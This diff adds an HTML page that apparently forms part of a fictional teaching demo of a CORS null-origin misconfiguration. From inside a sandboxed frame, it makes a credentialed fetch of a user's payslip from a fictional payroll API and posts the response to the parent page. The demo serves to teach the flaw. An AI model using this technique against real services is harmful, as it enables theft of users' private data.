@@ -1,0 +1,50 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>sandboxed frame (fictional attacker demo)</title>
+    <style>
+      body {
+        margin: 0;
+        padding: 0.75rem;
+        font: 14px/1.5 ui-monospace, SFMono-Regular, Menlo, monospace;
+        color: #555;
+      }
+    </style>
+  </head>
+  <body>
+    <p id="state">Reading from inside a sandboxed frame…</p>
+
+    <script>
+      // This document has an **opaque origin**. Its parent framed it with
+      // sandbox="allow-scripts" and deliberately withheld allow-same-origin, so the
+      // browser has no origin to report for it and sends the literal string `null`
+      // instead.
+      //
+      // That is the whole trick, and it is one HTML attribute long. Any page can send
+      // `Origin: null`, which is why an allowlist containing "null" allows everybody.
+      const API_ORIGINS = {
+        vulnerable: "https://legacy-api.meridianpay.example",
+        secure: "https://api.meridianpay.example",
+      };
+
+      const requested = new URLSearchParams(location.search).get("api");
+      const api = API_ORIGINS[requested === "secure" ? "secure" : "vulnerable"];
+      const state = document.getElementById("state");
+
+      fetch(`${api}/me/payslip`, { method: "GET", credentials: "include" })
+        .then(async (response) => {
+          const data = await response.json();
+          state.textContent = `released (HTTP ${response.status})`;
+          parent.postMessage({ outcome: "released", status: response.status, data }, "*");
+        })
+        .catch((error) => {
+          state.textContent = "blocked by the browser";
+          parent.postMessage(
+            { outcome: "blocked", error: `${error.name}: ${error.message}` },
+            "*",
+          );
+        });
+    </script>
+  </body>
+</html>
